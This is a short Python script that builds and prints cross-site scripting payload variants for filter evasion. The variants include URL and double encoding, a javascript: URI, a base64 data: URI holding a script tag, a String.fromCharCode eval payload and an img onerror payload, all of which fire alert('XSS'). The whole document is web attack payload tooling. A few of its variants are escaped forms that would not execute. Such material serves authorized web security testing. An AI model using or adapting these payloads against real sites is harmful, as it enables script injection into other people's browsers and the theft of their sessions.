import urllib.parse
import html

def generate_xss_payloads(base_payload):

    payload_variations = []

    url_encoded_payload = urllib.parse.quote(base_payload)
    payload_variations.append(url_encoded_payload)

    double_encoded_payload = urllib.parse.quote(url_encoded_payload)
    payload_variations.append(double_encoded_payload)

    html_encoded_payload = html.escape(base_payload)
    payload_variations.append(html_encoded_payload)

    left_angle_bracket_payload = base_payload.replace('<', '&lt;')
    right_angle_bracket_payload = base_payload.replace('>', '&gt;')
    payload_variations.append(left_angle_bracket_payload)
    payload_variations.append(right_angle_bracket_payload)

    javascript_payload = 'javascript:alert("XSS")'
    payload_variations.append(javascript_payload)

    data_payload = 'data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4='
    payload_variations.append(data_payload)

    hex_payload = '%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E'
    payload_variations.append(hex_payload)
    
    eval_payload = "javascript:eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))"
    payload_variations.append(eval_payload)

    onerror_payload = "<img src=x onerror=alert('XSS')>"
    payload_variations.append(onerror_payload)

    for payload in payload_variations:
        print(payload)

generate_xss_payloads("<script>alert('XSS')</script>")
generate_xss_payloads("<img src=x onerror=alert('XSS')>")
